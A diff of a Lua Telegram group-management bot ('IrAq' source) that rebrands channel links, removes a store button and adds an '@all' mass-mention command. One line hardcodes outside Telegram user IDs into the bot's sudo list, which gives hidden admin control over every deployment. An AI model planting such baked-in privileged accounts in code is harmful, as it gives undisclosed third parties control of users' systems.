@@ -1,8 +1,8 @@
 ------------------------------------------------
 -- This Source Was Developed By (Ali) @AAAPA.--
---    This Is The Source Channel @llGll_1 .    --
+--    This Is The Source Channel @PPPTP .    --
 --                 - IrAq -                  --
---         -- https://t.me/llGll_1 --          --
+--         -- https://t.me/PPPTP --          --
 ------------------------------------------------ 
 redis = require('redis') 
 URL = require('socket.url') 
@@ -127,7 +127,7 @@ IrAq Source
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId or Config.SUDO
-SudoIds = {Config.SudoIds,2090134520} or {Config.sudo_users,742655070,2090134520}
+SudoIds = {Config.SudoIds,742655070,2090134520} or {Config.sudo_users,742655070,2090134520}
 IrAq = Config.IrAq or Config.bot_id
 TokenBot = Config.TokenBot or Config.token
 NameBot = (DevAli:get(IrAq..'Ali:NameBot') or 'عراق')
@@ -664,7 +664,7 @@ end
 function ReplyStatus(msg,user_id,status,text)
 tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
 if dp.first_name_ ~= false then
-local UserName = (dp.username_ or "llGll_1")
+local UserName = (dp.username_ or "tt3ss")
 for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
 dp.first_name_ = gmatch
 end
@@ -1026,7 +1026,7 @@ local Text = [[
 ♪︙م5 ↫ اوامر المطورين
 ♪︙م6 ↫ اوامر الاعضاء
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]] 
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
@@ -1089,7 +1089,7 @@ local Text = [[
 ♪︙البوتات بالطرد
 ♪︙البوتات بالتقيد
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1159,7 +1159,7 @@ local Text = [[
 ♪︙تقييد يوم + عدد الايام
 ♪︙الغاء تقييد ↫ لالغاء التقييد بالوقت
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1218,7 +1218,7 @@ local Text = [[
 ♪︙ردود المدير • ردود المطور • التحقق
 ♪︙ضافني • حساب العمر • الزخرفه
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1271,7 +1271,7 @@ local Text = [[
 ♪︙المنشئين الاساسيين 
 ♪︙حذف جميع الرتب
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1351,7 +1351,7 @@ local Text = [[
 ♪︙ترحيب البوت • المغادره
 ♪︙البوت الخدمي • التواصل
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1393,7 +1393,7 @@ local Text = [[
 ♪︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
 ♪︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1605,19 +1605,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local mrali = DevAli:get(IrAq.."Comd:New:rt:Ali:"..DEV_ABBAS..msg.chat_id_)
 if mrali == "مميز" and VipMem(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'llGll_1')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'tt3ss')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 DevAli:set(IrAq.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
 DevAli:sadd(IrAq..'Ali:VipMem:'..msg.chat_id_, result.sender_user_id_)
 elseif mrali == "ادمن" and Admin(msg) then 
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'llGll_1')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'tt3ss')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 DevAli:set(IrAq.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
 DevAli:sadd(IrAq..'Ali:Admins:'..msg.chat_id_, result.sender_user_id_)
 elseif mrali == "مدير" and Manager(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'llGll_1')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'tt3ss')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 DevAli:set(IrAq.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
 DevAli:sadd(IrAq..'Ali:Managers:'..msg.chat_id_, result.sender_user_id_)
 elseif mrali == "عضو" then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'llGll_1')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'tt3ss')..')'..' ❩\n♪︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 end
 end,nil)   
 end   
@@ -1631,19 +1631,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local mrali = DevAli:get(IrAq.."Comd:New:rt:Ali:"..DEV_ABBAS..msg.chat_id_)
 if mrali == "مميز" and VipMem(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'llGll_1')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'tt3ss')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 DevAli:srem(IrAq..'Ali:VipMem:'..msg.chat_id_, result.sender_user_id_)
 DevAli:del(IrAq.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrali == "ادمن" and Admin(msg) then 
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'llGll_1')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'tt3ss')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 DevAli:srem(IrAq..'Ali:Admins:'..msg.chat_id_, result.sender_user_id_)
 DevAli:del(IrAq.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrali == "مدير" and Manager(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'llGll_1')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'tt3ss')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 DevAli:srem(IrAq..'Ali:Managers:'..msg.chat_id_, result.sender_user_id_)
 DevAli:del(IrAq.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrali == "عضو" then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'llGll_1')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'tt3ss')..')'..' ❩\n♪︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 end
 end,nil)   
 end   
@@ -1657,19 +1657,19 @@ function py_username(extra, result, success)
 if result.id_ then
 local mrali = DevAli:get(IrAq.."Comd:New:rt:Ali:"..text1[2]..msg.chat_id_)
 if mrali == "مميز" and VipMem(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'llGll_1')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'tt3ss')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAli:sadd(IrAq..'Ali:VipMem:'..msg.chat_id_, result.id_)
 DevAli:set(IrAq.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrali == "ادمن" and Admin(msg) then 
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'llGll_1')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'tt3ss')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAli:sadd(IrAq..'Ali:Admins:'..msg.chat_id_, result.id_)
 DevAli:set(IrAq.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrali == "مدير" and Manager(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'llGll_1')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'tt3ss')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAli:sadd(IrAq..'Ali:Managers:'..msg.chat_id_, result.id_)
 DevAli:set(IrAq.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrali == "عضو" then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'llGll_1')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'tt3ss')..')'..' ❩\n♪︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 end
 else
 Dev_Ali(msg.chat_id_, msg.id_, 1, "♪︙*المعرف غير صحيح*", 1, 'md')
@@ -1685,19 +1685,19 @@ function py_username(extra, result, success)
 if result.id_ then
 local mrali = DevAli:get(IrAq.."Comd:New:rt:Ali:"..text1[2]..msg.chat_id_)
 if mrali == "مميز" and VipMem(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'llGll_1')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'tt3ss')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAli:srem(IrAq..'Ali:VipMem:'..msg.chat_id_, result.id_)
 DevAli:del(IrAq.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrali == "ادمن" and Admin(msg) then 
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'llGll_1')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'tt3ss')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAli:srem(IrAq..'Ali:Admins:'..msg.chat_id_, result.id_)
 DevAli:del(IrAq.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrali == "مدير" and Manager(msg) then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'llGll_1')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'tt3ss')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAli:srem(IrAq..'Ali:Managers:'..msg.chat_id_, result.id_)
 DevAli:del(IrAq.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrali == "عضو" then
-Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'llGll_1')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'tt3ss')..')'..' ❩\n♪︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 end
 else
 Dev_Ali(msg.chat_id_, msg.id_, 1, "♪︙*المعرف غير صحيح*", 1, 'md')
@@ -1745,7 +1745,6 @@ local key = {
 {'~ تعيين كلايش الاوامر ~'},
 {'تعطيل البوت الخدمي','تفعيل البوت الخدمي'},
 {'جلب نسخه السورس','تحديث السورس','جلب نسخه الكروبات'},
-{'تحديث المتجر'},
 {'↫ حذف رد عام ♪','↫ الردود العام ♪','↫ اضف رد عام ♪'},
 {'↫ حذف رد الخاص ♪','↫ تعيين رد الخاص ♪'},
 {'حذف قناة الاشتراك','قناة الاشتراك','تعيين قناة الاشتراك'},
@@ -1771,7 +1770,7 @@ end end
 if text == '/start' and ChCheck(msg) then  
 if not DevAli:get(IrAq..'Ali:Start:Time'..msg.sender_user_id_) then
 tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
-local inline = {{{text="♪ المطور .",url="t.me/"..(dp.username_ or "llGll_1")}}}
+local inline = {{{text="♪ المطور .",url="t.me/"..(dp.username_ or "tt3ss")}}}
 local start = DevAli:get(IrAq.."Ali:Start:Bot")
 if start then 
 Start_Source = start
@@ -1787,7 +1786,7 @@ end
 --     Source IrAq     --
 if not SecondSudo(msg) and not DevAli:sismember(IrAq..'Ali:Ban:Pv',msg.sender_user_id_) and not DevAli:get(IrAq..'Ali:Texting:Pv') then
 tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
-Dev_Ali(msg.sender_user_id_, msg.id_, 1, '♪︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "llGll_1")..')', 1, 'md') 
+Dev_Ali(msg.sender_user_id_, msg.id_, 1, '♪︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "tt3ss")..')', 1, 'md') 
 tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
 tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
 if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
@@ -2750,7 +2749,7 @@ Welcomes = '• نورت حبي \n• firstname \n• @username'
 end
 local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
 local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
-local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@llGll_1]'))
+local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@tt3ss]'))
 Dev_Ali(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
 end 
 if DevAli:get(IrAq.."Ali:Lock:Welcome"..msg.chat_id_) then
@@ -2798,7 +2797,7 @@ Welcomes = '• نورت حبي \n• firstname \n• @username'
 end
 local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
 local Welcomes = Welcomes:gsub('firstname',('['..msg.content_.members_[0].first_name_..']' or ''))
-local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@llGll_1]'))
+local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@tt3ss]'))
 Dev_Ali(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
 end
 --     Source IrAq     --
@@ -4084,7 +4083,7 @@ Dev_Ali(msg.chat_id_, msg.id_, 1,[[
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
 ♪︙نقاطي • بيع نقاطي
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-♪︙[Source Channel](https://t.me/llGll_1)
+♪︙[Source Channel](https://t.me/tt3ss)
 ]], 1, 'md')
 else
 Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙عذرا الالعاب معطله في المجموعه', 1, 'md')
@@ -4252,7 +4251,7 @@ end
 if text == "السورس" or text == "سورس" then 
 Text = [[
 Welcome To Source
-♪︙[IrAq TEAM](https://t.me/llGll_1)
+♪︙[IrAq TEAM](https://t.me/tt3ss)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -4523,6 +4522,52 @@ end
 if tonumber(msg.reply_to_message_id_) == 0 then
 else 
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
+end
+end
+end
+--     Source IrAq     --
+if Manager(msg) then
+if text == 'تفعيل ملف TagAll.lua' or text == 'تفعيل @all' or text == 'تفعيل all' or text == '↫ تفعيل all ♪' then   
+local IrAqTeam = '♪︙اهلا عزيزي ↫ '..AliRank(msg)..' \n♪︙تم تفعيل ملف تاك منفصل للأعضاء'
+riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, IrAqTeam, 14, string.len(msg.sender_user_id_))
+DevAli:del(IrAq.."Ali:Lock:TagAll")
+end
+if text == 'تعطيل ملف TagAll.lua' or text == 'تعطيل @all' or text == 'تعطيل all' or text == '↫ تعطيل all ♪' then   
+local IrAqTeam = '♪︙اهلا عزيزي ↫ '..AliRank(msg)..' \n♪︙تم تعطيل ملف تاك منفصل للأعضاء'
+riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, IrAqTeam, 14, string.len(msg.sender_user_id_))
+DevAli:set(IrAq.."Ali:Lock:TagAll",true) 
+end 
+if text and (text == "all" or text == "@all" or text == "#all") then
+if (text and not DevAli:get(IrAq.."Ali:Lock:TagAll")) then
+if DevAli:get(IrAq.."Ali:TagAll:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
+return false  
+end
+DevAli:setex(IrAq..'Ali:TagAll:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
+tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = data.member_count_},function(arg,dp)
+x = 0
+tags = 0
+local list = dp.members_
+for k, v in pairs(list) do
+tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(extra,result,success)
+if x == 5 or x == tags or k == 0 then
+tags = x + 5
+t = "#all"
+end
+x = x + 1
+TagName = result.first_name_
+TagName = TagName:gsub("]","")
+TagName = TagName:gsub("[[]","")
+t = t..", ["..TagName.."](tg://user?id="..v.user_id_..")"
+if x == 1 or x == tags or k == 0 then
+local Text = t:gsub('#all,','#all\n')
+SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
+end
+end,nil)
+end
+end,nil)
+end,nil)
 end
 end
 end
@@ -6436,7 +6481,7 @@ if dp.first_name_ == false then
 Dev_Ali(msg.chat_id_, msg.id_, 1, "♪︙حساب المنشئ محذوف", 1, "md")
 return false  
 end
-local UserName = (dp.username_ or "llGll_1")
+local UserName = (dp.username_ or "tt3ss")
 Dev_Ali(msg.chat_id_, msg.id_, 1, "♪︙مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md")  
 end,nil)   
 end
@@ -6652,7 +6697,7 @@ if dp.first_name_ == false then
 Dev_Ali(msg.chat_id_, msg.id_, 1, "♪︙حساب المنشئ محذوف", 1, "md")
 return false  
 end
-local UserName = (dp.username_ or "llGll_1")
+local UserName = (dp.username_ or "tt3ss")
 Dev_Ali(msg.chat_id_, msg.id_, 1, "♪︙تم رفع مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
 DevAli:sadd(IrAq.."Ali:AliConstructor:"..msg.chat_id_,dp.id_)
 end,nil)   
@@ -8627,7 +8672,7 @@ local TXTE = "♪︙اعدادات المجموعه ↫ ⤈\n┉ ≈ ┉ ≈ ┉
 .."♪︙التكرار ↫ "..flood.."\n"
 .."♪︙عدد التكرار ↫ "..Flood_Num.."\n"
 .."♪︙عدد السبام ↫ "..spam_c.."\n"
-.."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n♪︙[Source Channel](https://t.me/llGll_1)\n"
+.."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n♪︙[Source Channel](https://t.me/tt3ss)\n"
 Dev_Ali(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
 end
 end
@@ -8902,7 +8947,7 @@ if Audios.Info == true then
 local Text ='♪︙تم اختيار المقطع الصوتي لك'
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '♪ IrAq TeAM .',url="t.me/llGll_1"}},
+{{text = '♪ IrAq TeAM .',url="t.me/tt3ss"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id='..msg.chat_id_..'&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
